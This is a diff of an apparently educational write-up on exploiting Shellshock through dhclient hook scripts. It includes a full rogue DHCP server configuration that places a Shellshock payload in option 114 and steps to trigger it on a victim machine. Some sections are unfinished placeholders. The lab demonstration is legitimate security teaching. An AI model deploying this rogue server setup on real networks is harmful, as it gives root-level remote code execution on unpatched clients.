@@ -74,11 +74,38 @@ The Dynamic Host Configuration Protocol (DHCP) defines a method for dynamically 
 
 On Unix operating systems, the `dhclient` command provides methods for automating the process of requesting an address and configuring a network interface to use it. `dhclient` includes a hook system to allow other programs to register callbacks for when a DHCP offer is accepted or an address is released. On Ubuntu 12.04, the `/etc/dhcp/dhclient-enter-hooks.d` and `/etc/dhcp/dhclient-exit-hooks.d` directories contain the scripts to be automatically executed by the hooks. Each script is automatically executed using Bash and the details of the DHCP offer are stored in environment variables. This feature allows seamlessly connecting to a network but creates the potential for security vulnerabilities.
 
-A malicious DHCP server embed a Shellshock payload into a DHCP Offer and cause remote code execution. All of the details of the 
+A malicious DHCP server could exploit `dhclient-script` using Shellshock to achieve remote code execution. Any values included in the DHCP offer to a client will be passed into each of the hooks via environment variables. If one of these values contains a Shellshock payload, it will be evaluated as a command. This vulnerability has a very high severity because the scripts are evaluated as root and are executed automatically when connecting to a network. Executing a script as the root user means that remote code execution will have the highest permissions of that machine and can completely comprise it. A machine can be completely comprised just by being on a network with the malicious server.
 
 ## Creating a Malicious DHCP Server
+The first step to creating a malicious DHCP server is to find a place to include our payload in the DHCP offer. The work of security researchers identified option 114 as one possible way. Option 114 is described as the "default url" field. This option is widely supported by DHCP clients despite not serving any purpose [7]. It is the perfect place to include our payload because it is a string field and clients will recognize it as a valid option. Other options could also likely be used.
+
+### Server Configuration
+This demonstration was once again designed for Ubuntu 18.04, but it could be modified to work on other operating systems. On the attacker machine: 
+1. First install `dhcpd` with `sudo apt install isc-dhcp-server`
+2. Modify `/etc/dhcp/dhcpd.conf` to contain the following:
+```
+default-lease-time 600;
+max-lease-time 7200;
+
+subnet 192.168.1.0 netmask 255.255.255.0 {
+ range 192.168.1.150 192.168.1.200;
+ option routers 192.168.1.1;
+ option domain-name-servers 8.8.8.8;
+ option domain-name "mydomain.example";
+ option default-url "() { :; }; /bin/echo pwned";
+ option dhcp-parameter-request-list = concat(option dhcp-parameter-request-list, 72);
+}
+```
+You can change the subnet and IP addresses to match your environment. The `default-url` option contains the Shellshock payload. The payload can be modified to execute any arbitrary command. The `dhcp-parameter-request-list` is necessary because by default the server will only send back options that the client asked for. This configuration always sends back option 0x72 (114) even if the client did not ask for it.
+3. Edit `/etc/default/isc-dhcp-server` so that it contains `INTERFACESv4="eth4"`. Replace `eth4` with the network interface to bind the server.
+4. Start the service with `sudo service isc-dhcp-server start`
 
 - Include picture of Wireshark
+
+### Manually calling dhclient
+On the victim machine, connect to the same network as the attacker machine and at the command line type `sudo dhclient`. You will observe that the server's payload is executed. In this example, you will see `pwned` printed.
+
+### Automatically 
 
 # Exploiting FTP
 
